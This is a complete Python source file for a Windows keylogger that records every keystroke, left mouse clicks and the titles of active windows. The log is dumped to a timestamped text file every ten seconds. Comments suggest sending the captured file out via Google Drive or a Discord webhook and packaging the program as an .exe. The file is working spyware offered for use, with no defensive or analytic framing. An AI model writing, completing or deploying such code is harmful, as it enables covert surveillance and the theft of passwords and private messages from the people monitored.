import pynput, threading, win32api, time, os, win32gui, unidecode

loggedKeys = "" 
storedKey = ""
activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())

os.chdir(os.path.dirname(__file__)) #remove if you are converting this program into .exe, use sys.executable instead

def mouseget():
    global loggedKeys 
    state_left = win32api.GetKeyState(0x01)
    while True:
        if win32api.GetKeyState(0x01) != state_left:
            state_left = win32api.GetKeyState(0x01)
            if win32api.GetKeyState(0x01) < 0: loggedKeys = loggedKeys + f" [Mouse.Left_Click] ".replace("'", "")
        time.sleep(0.02)

def send():
    global loggedKeys, activeWindow
    while True:
        time.sleep(10) # change if you want
        timenow = time.strftime("%d-%m-%Y_%H-%M-%S")

        with open(f"log_{timenow}.txt", "w", encoding="utf-8") as f: #i recommend to use utf-8 because of the accented letters
            f.write(loggedKeys)
            f.close()

        print(loggedKeys) # only for testing, i recommend you to delete it after testing
        # here you want to send the txt file somewhere. Maybe connect it to Google Drive or to Discord via webhook?

        os.remove(f"log_{timenow}.txt") #and dont forget to delete it
        activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())

def windowget():
    global loggedKeys, activeWindow
    while True:
        if win32gui.GetWindowText(win32gui.GetForegroundWindow()) != activeWindow:
            loggedKeys = loggedKeys + unidecode.unidecode(f" [{win32gui.GetWindowText(win32gui.GetForegroundWindow())}] ".replace("'", ""))
            activeWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())

def keyboardget(key):
    global loggedKeys, storedKey
    try:
        loggedKeys = loggedKeys + f"{str(storedKey)}".replace("'", "")
        if key.vk >= 96 and key.vk <= 105: storedKey = int(key.vk) - 96
        else: storedKey = key.char
    except AttributeError: loggedKeys = loggedKeys + f" [{str(key)}] ".replace("'", "")

threading.Thread(target=mouseget, daemon=True).start()
threading.Thread(target=send, daemon=True).start()
threading.Thread(target=windowget, daemon=True).start()
with pynput.keyboard.Listener(on_press=keyboardget) as listener: listener.join()
